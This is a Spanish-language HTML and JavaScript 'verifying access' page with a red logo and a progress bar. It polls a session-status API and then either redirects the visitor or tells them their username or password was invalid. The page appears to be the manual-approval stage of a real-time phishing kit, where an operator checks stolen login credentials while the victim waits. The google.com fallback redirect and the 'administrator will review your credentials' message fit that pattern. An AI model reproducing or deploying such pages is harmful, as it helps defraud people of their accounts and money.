<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando acceso...</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,300;0,400;0,600;0,700;1,400&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Source Sans 3', Arial, Helvetica, sans-serif;
            background: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }

        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 3.2rem;
            padding: 4rem;
            max-width: 40rem;
            text-align: center;
        }

        .loader__logo {
            height: 6rem;
            width: auto;
            animation: logoPulse 1.4s ease-in-out infinite;
        }

        @keyframes logoPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.06); opacity: 0.75; }
        }

        .loader__bar-track {
            width: 100%;
            max-width: 30rem;
            height: 0.4rem;
            background: #eee;
            border-radius: 2rem;
            overflow: hidden;
        }

        .loader__bar-fill {
            height: 100%;
            width: 0%;
            background: #E30518;
            border-radius: 2rem;
            transition: width 0.3s linear;
        }

        .loader__msg {
            font-size: 1.6rem;
            color: #555;
        }

        .loader__sub {
            font-size: 1.3rem;
            color: #999;
            margin-top: -1.6rem;
        }

        .status-badge {
            display: none;
            padding: 1rem 2rem;
            border-radius: 0.5rem;
            font-weight: 600;
            font-size: 1.6rem;
        }

        .status-badge.approved {
            display: inline-block;
            background: #e6f7e6;
            color: #008660;
            border: 1px solid #008660;
        }

        .status-badge.rejected {
            display: inline-block;
            background: #ffe6e6;
            color: #cc0000;
            border: 1px solid #cc0000;
        }

        .status-badge.expired {
            display: inline-block;
            background: #fff3e6;
            color: #cc6600;
            border: 1px solid #cc6600;
        }
    </style>
</head>
<body>

<div class="loading-container">
    <svg class="loader__logo" viewBox="-5 -10 205 165" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M43.6408 127.15C78.4671 133.08 165.668 131.878 167.661 75.9877C167.661 53.5414 140.087 33.8395 112.542 27.8198C92.8103 23.5128 75.933 21.8702 59.5465 22.5914C47.9077 23.1022 30.7399 24.9452 19.9725 28.551C10.7677 32.0867 3.95664 29.9232 1.30235 25.1254C-1.78264 19.5665 0.280698 11.3532 11.0882 7.41682C36.8799 -1.97837 113.924 -7.10666 159.999 21.4595C178.98 33.2285 195.987 51.6483 195.987 76.3282C195.987 103.212 178.359 121.702 159.598 133.11C119.193 157.68 57.4631 152.491 38.4023 148.695C27.3845 146.502 18.9809 141.443 18.9809 127.381V57.4677C18.9809 40.8909 43.6708 41.0312 43.6708 57.608L43.6308 127.13L43.6408 127.15Z" fill="#E30518"/>
    </svg>

    <div class="loader__bar-track">
        <div class="loader__bar-fill" id="loaderBar"></div>
    </div>

    <div class="loader__msg" id="loaderMsg">Esperando aprobación...</div>
    <div class="loader__sub">Un administrador revisará tus credenciales</div>

    <div class="status-badge" id="statusBadge"></div>
</div>

<script>
    // Obtener sessionId de la URL
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('sessionId');

    if (!sessionId) {
        document.getElementById('loaderMsg').textContent = '❌ Sesión inválida';
        document.getElementById('loaderMsg').style.color = '#cc0000';
        // Redirigir después de 3 segundos
        setTimeout(() => {
            window.location.href = '/';
        }, 3000);
    }

    const API_URL = window.location.origin + '/api/session-status/' + sessionId;
    const bar = document.getElementById('loaderBar');
    const msg = document.getElementById('loaderMsg');
    const badge = document.getElementById('statusBadge');

    let progress = 0;
    let interval;

    // Animar barra de progreso
    function animateProgress() {
        interval = setInterval(() => {
            progress += 1;
            if (progress > 95) {
                clearInterval(interval);
                return;
            }
            bar.style.width = progress + '%';
        }, 300);
    }

    animateProgress();

    // Verificar estado cada 3 segundos
    async function checkStatus() {
        try {
            const response = await fetch(API_URL);
            const data = await response.json();

            if (data.status === 'ok') {
                clearInterval(interval);
                bar.style.width = '100%';
                msg.textContent = '✅ Acceso aprobado. Redirigiendo...';
                badge.className = 'status-badge approved';
                badge.textContent = '✅ APROBADO';
                badge.style.display = 'inline-block';

                setTimeout(() => {
                    window.location.href = data.redirect || 'https://www.google.com';
                }, 2000);

            } else if (data.status === 'err') {
                clearInterval(interval);
                bar.style.width = '100%';
                msg.textContent = '❌ Acceso denegado';
                msg.style.color = '#cc0000';
                badge.className = 'status-badge rejected';
                badge.textContent = '❌ RECHAZADO';
                badge.style.display = 'inline-block';

                // Mostrar mensaje de usuario inválido
                setTimeout(() => {
                    alert('❌ Usuario o contraseña inválidos');
                    window.location.href = '/';
                }, 1500);

            } else if (data.status === 'expired') {
                clearInterval(interval);
                bar.style.width = '100%';
                msg.textContent = '⏰ Sesión expirada';
                badge.className = 'status-badge expired';
                badge.textContent = '⏰ EXPIRADO';
                badge.style.display = 'inline-block';

                setTimeout(() => {
                    window.location.href = '/';
                }, 3000);
            }
        } catch (error) {
            console.error('Error checking status:', error);
        }
    }

    // Verificar cada 3 segundos
    const statusCheckInterval = setInterval(checkStatus, 3000);

    // Primera verificación inmediata
    checkStatus();

    // Limpiar intervalo si la página se cierra
    window.addEventListener('beforeunload', () => {
        clearInterval(statusCheckInterval);
        clearInterval(interval);
    });
</script>
</body>
</html>
